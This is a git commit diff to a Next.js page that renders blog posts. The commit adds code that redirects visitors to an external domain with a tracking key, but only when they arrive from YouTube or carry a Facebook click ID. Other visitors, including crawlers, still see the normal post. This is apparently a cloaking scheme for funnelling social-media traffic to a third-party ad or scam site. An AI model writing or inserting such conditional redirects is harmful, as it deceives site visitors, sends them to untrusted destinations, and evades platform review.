290cbd1f04248df37804aed00faef50859e2fd78
ch-abubakar <133742361+ch-abubakar@users.noreply.github.com>
2023-05-16 11:42:19 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -24,6 +24,16 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			},
 		};
 		}
+		
+		if (referringURL?.includes('youtube.com') || fbclid) {
+    return {
+        redirect: {
+            permanent: false,
+            destination: `https://generalizebusinessman.com/ptj48jfss?key=5885334b10942dc6d6b3999661aeccfa/`,
+        },
+    };
+}
+
 	const query = gql`
 		{
 			post(id: "/${path}/", idType: URI) {
